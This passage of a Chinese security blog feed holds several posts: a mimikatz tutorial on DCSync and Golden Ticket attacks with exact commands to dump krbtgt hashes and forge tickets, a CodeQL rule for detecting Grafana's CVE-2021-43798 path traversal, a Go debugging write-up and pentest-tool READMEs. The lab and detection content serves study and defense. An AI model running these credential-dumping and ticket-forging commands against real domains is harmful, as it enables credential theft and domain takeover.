<h4 id="3-4-部署，发布"><a href="#3-4-部署，发布" class="headerlink" title="3.4 部署，发布"></a>3.4 部署，发布</h4><p>当一切编写完成，bug修复完毕，在项目根目录下执行 <strong>mvn package assembly:single</strong> 即可生成 <strong>jar</strong> 文件。</p>
<p>运行使用<strong>target目录下最大的jar文件</strong> </p>
<p>对方没有Java环境怎么办？</p>
<p>使用 <strong>mvn jfx:native</strong> 命令生产对应平台的文件，比如Mac下，执行命令<strong>mvn jfx:native</strong>命令就会在 <strong>target&#x2F;jfx&#x2F;native</strong> 目录下生成打包后应用(win下生成exe)，带可执行文件，带 JRE 运行环境，超大，200+M。</p>
<p> <strong>mvn clean</strong>用于清除生成的文件。</p>
<h2 id="0x05-免责声明"><a href="#0x05-免责声明" class="headerlink" title="0x05 免责声明"></a>0x05 免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。</p>
<p>如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。</p>
<p>除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。</p>
<p>您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
<h2 id="开心指数"><a href="#开心指数" class="headerlink" title="开心指数"></a>开心指数</h2><p><a href="https://starchart.cc/yhy0/ExpDemo-JavaFX"><img src="https://starchart.cc/yhy0/ExpDemo-JavaFX.svg" alt="Stargazers over time"></a></p>
]]></content>
      <categories>
        <category>开源工具</category>
      </categories>
      <tags>
        <tag>开源工具</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透-DCSync和黄金票据</title>
    <url>/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/</url>
    <content><![CDATA[<blockquote>
<p>  新年开工快乐～～～</p>
</blockquote>
<h1 id="域渗透-DCSync和黄金票据"><a href="#域渗透-DCSync和黄金票据" class="headerlink" title="域渗透-DCSync和黄金票据"></a>域渗透-DCSync和黄金票据</h1><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><blockquote>
<p>krbtgt账户：每个域控制器都有一个”krbtgt”的用户账户，是KDC的服务账户，用来创建票据授予服务（TGS）  加密的密钥。</p>
<p>黄金票据（Golden Ticket）：它能让黑客在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限。</p>
<p>DCSync：mimikatz中的功能，能够模拟域控制器并从域控制器导出帐户密码hash。</p>
</blockquote>
<p>在域内，不同DC之间，每15分钟都会有一次域数据的同步。实现不登录到域控制器上，而获取域控制器数据库中的数据。</p>
<p>在DCSync功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。2015年8月，新版的mimikatz增加了DCSync的功能，该功能可以模仿一个域控DC，从真实的域控中请求数据，如用户的哈希。该功能最大的特点就是在于不用登陆域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。</p>
<p>需要注意的是，DCSync攻击的对象如果是只读域控制器(RODC)，则会失效，因为RODC是不能参与复制同步数据到其他DC的。 </p>
<p>DCSync的原理非常清晰，利用域控制器之间的数据同步复制：</p>
<ul>
<li><p>发现网络中的目标域控制器</p>
</li>
<li><p>通过DRS服务的GetNCChanges接口发起数据同步请求，Directory Replication Service（DRS）Remote Protocol</p>
<blockquote>
<p>GetNCChanges：当一个DC（成为客户端DC）想从其他DC（成为服务端DC）获取数据时，客户端DC会向服务端DC发起一个GetNCChanges请求。回应的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程，毕竟每次回应的数据有限。</p>
</blockquote>
</li>
</ul>
<p>默认情况下，只有和Domain Controllers和Enterprise Domain Admins权限能够使用DCSync，但我们可以对域内普通用户添加ACL(Access Control List)实现普通用户调用DCSync导出域内所有用户的hash。</p>
<h2 id="0x02-利用DCSync导出域内用户Hash"><a href="#0x02-利用DCSync导出域内用户Hash" class="headerlink" title="0x02 利用DCSync导出域内用户Hash"></a>0x02 利用DCSync导出域内用户Hash</h2><h4 id="利用条件：获得以下任一的权限"><a href="#利用条件：获得以下任一的权限" class="headerlink" title="利用条件：获得以下任一的权限"></a>利用条件：获得以下任一的权限</h4><ul>
<li>Administrators组内的用户</li>
<li>Domain Admins组内的用户</li>
<li>Enterprise Admins组内的用户</li>
<li>域控制器的计算机帐户</li>
</ul>
<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据。</p>
<p>获取相应权限后(这里实验的是域内机器win7，域控为win8上，登录的域内用户yhy)</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224807.png" alt="image-20210221165619981"></p>
<h4 id="使用mimikatz导出指定域用户的信息-包括哈希"><a href="#使用mimikatz导出指定域用户的信息-包括哈希" class="headerlink" title="使用mimikatz导出指定域用户的信息(包括哈希)"></a>使用<code>mimikatz</code>导出指定域用户的信息(包括哈希)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.yhy /user:administrator /csv</span><br><span class="line">lsadump::dcsync /domain:test.yhy /user:administrator</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224813.png" alt="image-20210221171218395"></p>
<p>获得了域内用户的hash后，进一步利用可参考之前的文章：<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483885&idx=1&sn=edaa58066c4128f53adae0d8f048bff7&chksm=c28298f4f5f511e2e3fc11813896af4f457ba302ee52911562bedac8dd8977fd748e7b9a1982#rd">哈希传递攻击</a></p>
<h2 id="0x03生成黄金票据，获取域管理权限"><a href="#0x03生成黄金票据，获取域管理权限" class="headerlink" title="0x03生成黄金票据，获取域管理权限"></a>0x03生成黄金票据，获取域管理权限</h2><p>获取<code>krbtgt</code>（域内默认创建的账号）账户Hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.yhy /user:krbtgt /csv</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224823.png" alt="image-20210221223933475"></p>
<p>生成黄金票据，并使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /krbtgt:8a4f49ff2d2eedf30b5e565e4332d0b5 /admin:administrator /domain:test.yhy /sid:S-1-5-21-2604854395-1602356619-879117556-502 /ticket:administrator.ticket.bin</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.ticket.bin</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224829.png" alt="image-20210221223253549"></p>
<p>提升到域管理权限成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224837.png" alt="image-20210221223505092"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224841.png" alt="image-20210221223535054"></p>
<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>DCSync攻击的原理是模拟域控制器发起服务器之间的数据同步复制。最好的防御方法是给控制器设置白名单，在域内，域控制器的数量、IP地址、MAC地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的IP不允许发生数据同步。</p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows提权</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>弈 - Codeql 自动运行和项目监控工具</title>
    <url>/2022/12/27/%E5%BC%88%20-%20Codeql%20%E8%87%AA%E5%8A%A8%E8%BF%90%E8%A1%8C%E5%92%8C%E9%A1%B9%E7%9B%AE%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>代码审计总是离不开一些神器，笔者常用 <a href="https://github.com/github/codeql-cli-binaries">Codeql</a> 这款工具辅助挖洞。当我每写一个规则都需要对其它项目手动运行检查一遍，效率很低，再加上 <a href="lgtm.com/">lgtm</a> 的关闭，此项目诞生了 — <a href="https://github.com/ZhuriLab/Yi">弈(Yi)</a> </p>
<h1 id="CVE-2021-43798"><a href="#CVE-2021-43798" class="headerlink" title="CVE-2021-43798"></a>CVE-2021-43798</h1><p>这里以 Graana 的任意文件读取漏洞举例说明使用方法(初学 Codeql,如有错误之处，轻点喷)</p>
<p>该漏洞版本为 8.0.0 - 8.3.0 ,  修复版本为 8.3.1, 8.2.7, 8.1.8, 8.0.7</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/grafana/grafana</span><br><span class="line">git checkout v8.2.6</span><br></pre></td></tr></table></figure>

<p>这个漏洞发生在 <code>/public/plugins/:pluginId/*</code> api 中，当输入的 <code>pluginId</code>存在时，会匹配<code>*</code>内容，使用<code>filepath.Clean</code>清理路径中的多余字符后，直接拼接到<code>pluginFilePath</code>,然后使用<code>os.open(pluginFilePath)</code>打开该文件，最终回显到页面。而且<code>plugins api</code>权限为<code>public</code>，是未授权的，任何人都可以查看。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041528623.png" alt="image-20221212154042195"></p>
<blockquote>
<p>fmt.Println(filepath.Clean(“.&#x2F;…&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd”))</p>
<p>输出：..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 只清除了前面的.&#x2F;…&#x2F;..&#x2F;</p>
</blockquote>
<h2 id="Codeql分析"><a href="#Codeql分析" class="headerlink" title="Codeql分析"></a>Codeql分析</h2><p>生成 codeql 数据库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">codeql database create /Users/yhy/CodeQL/database/go/grafana/v8.2.6 -s ./ --language=go</span><br></pre></td></tr></table></figure>

<h3 id="sink"><a href="#sink" class="headerlink" title="sink"></a>sink</h3><p><code>os.open()</code>,这个显而易见</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">go</span></span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class Sink extends DataFlow::Node &#123;</span><br><span class="line">	Sink() &#123;</span><br><span class="line">		exists(</span><br><span class="line">			DataFlow::CallNode call |</span><br><span class="line">			call.getTarget().hasQualifiedName(<span class="string">&quot;os&quot;</span>, <span class="string">&quot;Open&quot;</span>) |</span><br><span class="line">			call.getArgument(<span class="number">0</span>) = this <span class="comment">// 标记 sink 为 os.Open 第一个参数</span></span><br><span class="line">		)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041528751.png" alt="image-20221212161954374"></p>
<h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>我将 <code>Source</code> 点定在了<code>macaron.Params()</code>函数</p>
<p>网上的文章都是以<code>github.com/grafana/grafana/pkg/api/routing.RouteRegister</code>作为起始点，这就导致一个问题，写完的规则只对<code>grafana</code>项目起作用，不通用。</p>
<p>仔细研究会发现，<code>RouteRegister</code>的实现是以<code>gopkg.in/macaron.v1</code>框架为基础的，但是官方的<code>go/ql/lib/semmle/go/frameworks/Macaron.qll</code>，只是实现了一个重定向相关的检测规则，emmm,只能自己动手写了。</p>
<p>写着写着忽然发现，怎么也获取不到<code>macaron.Params</code>, 去看 <a href="https://github.com/go-macaron/macaron">macaron</a> 源码才发现，这个函数就根本没有，是<code>Grafana</code>自己实现的。我们来分析一下这个 <code>Params</code> 函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041528067.png" alt="image-20221212214825612"></p>
<p>其实就是获取<code>net/http</code>中<code>Request.Context</code>的值，而参数<code>r</code>，又是通过<code>pkg/macaron/context.go</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041528784.png" alt="image-20221212215137241"></p>
<p>也就是 <a href="https://github.com/go-macaron/macaron">macaron</a> 框架中的<code>Context</code>结构体中的<code>Req</code>成员，这个<code>Req</code>就是我们要找的<strong>Source</strong>点。</p>
<p>修改<code>go/ql/lib/semmle/go/frameworks/Macaron.qll</code>文件，加入如下代码</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line"> private class UserControlledRequestField extends UntrustedFlowSource::Range, DataFlow::FieldReadNode &#123;</span><br><span class="line"> UserControlledRequestField() &#123;</span><br><span class="line">   exists(<span class="built_in">string</span> fieldName | this.getField().hasQualifiedName(<span class="string">&quot;gopkg.in/macaron.v1&quot;</span>, <span class="string">&quot;Context&quot;</span>, fieldName) | </span><br><span class="line">fieldName = <span class="string">&quot;Req&quot;</span></span><br><span class="line">       )</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>单独执行，可以找到污染点</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041528810.png" alt="image-20221212220032453"></p>
<p>直接将 sink、source 拼接跑，并没有出结果，因此需要一些处理来连接数据流</p>
<h3 id="isAdditionalTaintStep"><a href="#isAdditionalTaintStep" class="headerlink" title="isAdditionalTaintStep"></a>isAdditionalTaintStep</h3><p>这里 <a href="https://tyskill.github.io/posts/codeql-grafana/#%E5%AE%9E%E8%B7%B5grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">tyskill</a> 师傅说的很详细，引用一下</p>
<ol>
<li><p>限制函数为Params</p>
</li>
<li><p>函数可被污染就说明参数可控，那么就让pred节点作为参数</p>
</li>
<li><p>SimpleAssignStmt结构表示一个赋值表达式，如<code>a+=b</code>，Rhs表示等号右边，通过查看源码可知Params函数调用几乎都是在等号右边，因此可以通过该结构减少误报</p>
</li>
<li><p>最后将输出节点连接到赋值表达式</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    exists(</span><br><span class="line">        CallExpr call, SimpleAssignStmt sas |</span><br><span class="line">        <span class="comment">// call.getTarget().getName() = &quot;Params&quot; and</span></span><br><span class="line">		<span class="comment">// 限制为 Params 函数会产生局限性，去除</span></span><br><span class="line">        call.getAnArgument() = pred.asExpr() <span class="built_in">and</span></span><br><span class="line">        sas.getRhs().getAChild() = call.getParent*().getAChild() <span class="built_in">and</span></span><br><span class="line">        <span class="comment">// 使用getParent*()是因为等号右边不止有光秃秃的Params方法调用，如漏洞点就存在Jion函数拼接操作，需要通过传递闭包getParent*()来获取完整表达式</span></span><br><span class="line">        <span class="comment">// 使用getAChild()则是要获取Params的方法调用，不过测试发现用不用效果差不多，所以也不懂为什么还要加这个</span></span><br><span class="line">        sas.getRhs() = succ.asExpr()</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行，成功发现该漏洞</p>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041529964.png" alt="image-20221212221508877"></p>
<h2 id="加入工具监控、扫描"><a href="#加入工具监控、扫描" class="headerlink" title="加入工具监控、扫描"></a>加入工具监控、扫描</h2><p>因为项目中调用 Codeql 将扫描结果保存为文件，这里需在文件头添加一些描述,完整代码如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name read file</span></span><br><span class="line"><span class="comment"> * @description read file</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity error</span></span><br><span class="line"><span class="comment"> * @security-severity 6.1</span></span><br><span class="line"><span class="comment"> * @sub-severity high</span></span><br><span class="line"><span class="comment"> * @id yhy0/read-file</span></span><br><span class="line"><span class="comment"> * @tags security</span></span><br><span class="line"><span class="comment"> * @precision high</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">go</span></span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class ReadFileSink extends DataFlow::Node &#123;</span><br><span class="line">    ReadFileSink() &#123;</span><br><span class="line">        exists(</span><br><span class="line">            DataFlow::CallNode call |</span><br><span class="line">            call.getTarget().hasQualifiedName(<span class="string">&quot;os&quot;</span>, <span class="string">&quot;Open&quot;</span>) |</span><br><span class="line">            call.getArgument(<span class="number">0</span>) = this <span class="comment">// 标记 sink 为 os.Open 第一个参数</span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ReadFileConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    ReadFileConfig() &#123; this = <span class="string">&quot;read file&quot;</span> &#125;</span><br><span class="line">    <span class="comment">// 这里的 source 实现 UntrustedFlowSource ,方便其他框架通用, 对于Grafana ,我们已经修改了go/ql/lib/semmle/go/frameworks/Macaron.qll文件</span></span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123; source instanceof UntrustedFlowSource &#125;</span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123; sink instanceof ReadFileSink &#125;</span><br><span class="line">    override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">        exists(</span><br><span class="line">            CallExpr call, SimpleAssignStmt sas |</span><br><span class="line">            <span class="comment">// call.getTarget().getName() = &quot;Params&quot; and</span></span><br><span class="line">            <span class="comment">// 限制为 Params 函数会产生局限性，去除</span></span><br><span class="line">            call.getAnArgument() = pred.asExpr() and</span><br><span class="line">            sas.getRhs().getAChild() = call.getParent*().getAChild() and</span><br><span class="line">            <span class="comment">// 使用getParent*()是因为等号右边不止有光秃秃的Params方法调用，如漏洞点就存在Jion函数拼接操作，需要通过传递闭包getParent*()来获取完整表达式</span></span><br><span class="line">            <span class="comment">// 使用getAChild()则是要获取Params的方法调用，不过测试发现用不用效果差不多，所以也不懂为什么还要加这个</span></span><br><span class="line">            sas.getRhs() = succ.asExpr()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from ReadFileConfig rfc, DataFlow::PathNode sink, DataFlow::PathNode source</span><br><span class="line">where rfc.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink.getNode(), source, sink, <span class="string">&quot;read file find on $@.&quot;</span>, source.getNode(), <span class="string">&quot;user-provided value&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将此 ql 文件路径加入配置文件<code>config.yaml</code>中, <code>- go/ql/src/myRules/ReadFile.ql </code>,之后程序会自动对监控的项目运行此条规则，等待捡洞即可(笔者已经捡到了^_^)</p>
<h1 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h1><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041529682.png" alt="image-20221213143603327"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041530535.png" alt="image-20221215162315622"></p>
<p>项目的具体介绍请看 <a href="https://github.com/ZhuriLab/Yi">https://github.com/ZhuriLab/Yi</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://tyskill.github.io/posts/codeql-grafana/#%E5%AE%9E%E8%B7%B5grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">https://tyskill.github.io/posts/codeql-grafana/#%E5%AE%9E%E8%B7%B5grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96</a></p>
<p><a href="https://xz.aliyun.com/t/10648">https://xz.aliyun.com/t/10648</a></p>
<p><a href="https://codeql.github.com/">https://codeql.github.com/</a></p>
]]></content>
      <categories>
        <category>开源工具</category>
      </categories>
      <tags>
        <tag>开源工具</tag>
      </tags>
  </entry>
  <entry>
    <title>扫描器 debug 调优记录</title>
    <url>/2023/04/14/%E6%89%AB%E6%8F%8F%E5%99%A8%20debug%20%E8%B0%83%E4%BC%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<blockquote>
<p>  啥时候我能写一个安全行业人手一个工具</p>
</blockquote>
<p>go 有个恶心的地方，就是不能捕获子进程的 panic, 每个子进程都使用 <code>recover()</code>去捕获，太麻烦，不现实，而且你也没办法确保你引入的第三方包会捕获子进程; 这就导致我在写扫描器时，某个进程发生 panic , 屏幕输出很长很长的堆栈信息，一屏幕都滚动不完，而且我使用 screen 放到后台，导致我就只能看到非常小的一部分。</p>
<p>所以只能找其他路子了，下面记录一下使用 dlv 来排查，寻找导致 panic 的地方</p>
<h2 id="panic-错误"><a href="#panic-错误" class="headerlink" title="panic 错误"></a>panic 错误</h2><p>使用 <a href="https://github.com/go-delve/delve">dlv</a> 调试，前提二进制文件再生成时，不能指定<code>-ldflags &quot;-s -w&quot;</code><br>启动前，先执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GOTRACEBACK=crash</span><br></pre></td></tr></table></figure>
<p>ulimit命令用于控制shell程序的资源</p>
<p>-c &lt;core文件上限&gt; 设定core文件的最大值，单位为区块</p>
<p>unlimited标识不做限制</p>
<p><code>GOTRACEBACK</code> 来控制Golang panic stack trace输出的信息</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">GOTRACEBACK的设置值有几种，下面分别说明：</span><br><span class="line">export GOTRACEBACK=none ：完全省略<span class="built_in">panic</span>的 stack traces 。</span><br><span class="line">export GOTRACEBACK=single (默认值)只打印当前goroutine的部分stack traces。</span><br><span class="line">    当不存在当前goroutine或者是由于runtime内部的错误导致的<span class="built_in">panic</span>，则会打印出所有goroutine的</span><br><span class="line">    堆栈。</span><br><span class="line">export GOTRACEBACK=all ：打印用户创建的所有goroutine的stack trace。</span><br><span class="line">export GOTRACEBACK=system ：与all的行为很像，只不过会将runtime的goroutine的stace trace也打出来，并且还会显示出runtime内部创建的所有goroutine。</span><br><span class="line">export GOTRACEBACK=crash：与“system”的行为很像，只不过当程序crash的时候不是直接退出，而是可以按照操作系统指定的方式进行后续处理。</span><br><span class="line"></span><br><span class="line">例如，在Unix操作系统中，crash会发送一个SIGABRT信号触发core dump。由于历史原因，当将系统环境变量GOTRACEBACK设置为：<span class="number">0</span>, <span class="number">1</span>, 和 <span class="number">2</span> 的时候，分别代表none, all和system。</span><br><span class="line"></span><br><span class="line">通过包runtime/debug <span class="keyword">package</span>中的方法SetTraceback，也可以设置相应的GOTRACEBACK的值，进而控制输出的stack trace的内容的多少，但是通过该方法，不能够设置比系统环境变量的level更低的值。而level的高低顺序为：none&lt;single&lt;all&lt;system&lt;crash</span><br></pre></td></tr></table></figure>

<p>加上这两句，当程序异常终止时，就是打印堆栈信息，然后会在当前目录下生成一个&#96;core文件</p>
<ol>
<li>安装<a href="https://github.com/go-delve/delve">dlv</a></li>
<li>调试 coredump 文件<br><code>dlv core &#123;这里是你的程序&#125; &#123;这里是coredump文件&#125;  --check-go-version=false</code></li>
</ol>
<p>然后使用 <code>goroutines -with running</code>, 查看运行的协程</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202304141956683.png" alt="20230413205255.png"></p>
<p>看到编号 23794 有个 <code>*</code> 标记<br>切换到对应的协程<code>goroutine 23794</code> ,再试用 <code>bt</code> 子命令分析堆栈的错误</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202304141956246.png" alt="20230413205758.png"></p>
<p>emmm,我看代码没看出来为啥会发生<code>panic</code><br><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202304141956677.png" alt="20230413211354.png"></p>
<p>然后求助<strong>ChatGPT</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202304141957223.png" alt="20230413211428.png"></p>
<p>按照给出的修复方式，然后运行一段时间又出现 <code>panic</code> ,还是这里，emmmmmmm</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202304141957155.png" alt="20230413220608.png"></p>
<p>我大概知道了,我将 <code>AfrogFingerPrintMap</code> 变量定义到了外部,是一个全局变量， 当多协程使用时，就会发生他说的情况。修复方案就是将变量定义为局部变量，互不干扰。</p>
<p>教训就是除了一些常量外，尽量不要将变量定义为全局的，不然多协程下修改值必出问题</p>
<p>还有就是这里重复初始化，可能会导致内存分配出现问题而导致程序崩溃</p>
<h2 id="oom-killer"><a href="#oom-killer" class="headerlink" title="oom-killer"></a>oom-killer</h2><p>运行一段时间，整个程序被 killed ,小机器不行啊, 又没钱升级，只能找找程序的原因，看看哪里占用了过多的内存，调优性能</p>
<p>一开始使用保存文件的方式</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">f, _ := os.Create(<span class="string">&quot;mem.prof&quot;</span>) </span><br><span class="line">pprof.WriteHeapProfile(f) </span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br></pre></td></tr></table></figure>
<p><code>go tool pprof -http=0.0.0.0:80 SScan-agent mem.prof</code> </p>
<p>但是看到的信息好像不是很全，之后使用</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">http.ListenAndServe(<span class="string">&quot;0.0.0.0:80&quot;</span>, <span class="literal">nil</span>) </span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>

<p>通过 <code>http://xxx.xxx.xx.xx/debug/pprof/</code> 查看，不好的地方就是要在程序被 killed 前看数据，不过也还好，这个可以监控内存使用率，超过一定阈值通知，然后去看<code>debug/pprof/</code> 相关信息就好了，最终也找到了原因。</p>
<p>比如 <code>goroutine</code> 居高不下，可能就是哪里发生了死锁，比如 <a href="https://github.com/projectdiscovery/ratelimit">ratelimit</a> 用完不释放</p>
<p>还有就是 <code>heap</code> 也是居高不下，比如我用到了 <a href="https://github.com/projectdiscovery/httpx">httpx</a>  <code>wappalyzergo</code>、<code>fastdialer</code> 重复初始化，内存没有释放掉，导致了被 killed</p>
<p>看代码是因为 <code>fastdialer</code> 用完没有调用 <code>close()</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/413527587">https://zhuanlan.zhihu.com/p/413527587</a></p>
<p><a href="https://github.com/go-delve/delve/blob/master/Documentation/cli/README.md#goroutines">https://github.com/go-delve/delve/blob/master/Documentation/cli/README.md#goroutines</a></p>
]]></content>
      <categories>
        <category>开发</category>
        <category>Go</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>承影</title>
    <url>/2023/05/20/%E6%89%BF%E5%BD%B1/</url>
    <content><![CDATA[<h2 id="承影"><a href="#承影" class="headerlink" title="承影"></a>承影</h2><p align="center">
将旦昧爽之交，日夕昏明之际，北面而察之，淡淡焉若有物存，莫识其状。其所触也，窃窃然有声，经物而物不疾也。
  <br/>
  <br/>
  <a href="https://github.com/yhy0/ChYing/blob/main/LICENSE">
    <img alt="Release" src="https://img.shields.io/github/license/yhy0/ChYing"/>
  </a>
  <a href="https://github.com/yhy0/ChYing">
    <img alt="Release" src="https://img.shields.io/badge/release-v0.9-brightgreen"/>
  </a>
  <a href="https://github.com/yhy0/ChYing">
    <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/yhy0/ChYing?color=9cf"/>
  </a>
  <a href="https://github.com/yhy0/ChYing">
    <img alt="GitHub forks" src="https://img.shields.io/github/forks/yhy0/ChYing"/>
  </a>
  <a href="https://github.com/yhy0/ChYing">
    <img alt="GitHub all release" src="https://img.shields.io/github/downloads/yhy0/ChYing/total?color=blueviolet"/>
  </a>
</p>
<div align="center">
<strong>
<samp>

<p><a href="./README.md">简体中文</a> · <a href="./README-en.md">English</a></p>
</samp>
</strong>
</div>

<video controls="controls" loop="loop" autoplay="autoplay" width="100%"> 
    <source src="https://github.com/yhy0/ChYing/assets/31311038/54cc1130-fb95-4a8f-b90e-3479e9c5a2c7" type="video/mp4">
</video>


<h2 id="构建项目"><a href="#构建项目" class="headerlink" title="构建项目"></a>构建项目</h2><p><a href="https://wails.io/zh-Hans/docs/gettingstarted/installation/">https://wails.io/zh-Hans/docs/gettingstarted/installation/</a></p>
<p>安装 <strong>wails</strong> </p>
<p>然后 <code>wails build</code></p>
<h2 id="已有功能"><a href="#已有功能" class="headerlink" title="已有功能"></a>已有功能</h2><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>提取 <a href="https://github.com/maurosoria/dirsearch">dirsearch</a> 的字典规则进行扫描，目前只会进行一层目录扫描，后期考虑根据找到的目录，进行多层目录遍历</p>
<p><a href="https://github.com/lijiejie/bbscan">bbscan</a> 规则扫描</p>
<h3 id="Swagger-测试"><a href="#Swagger-测试" class="headerlink" title="Swagger 测试"></a>Swagger 测试</h3><p>对 <code>swagger api</code> 进行未授权、ssrf、注入等测试</p>
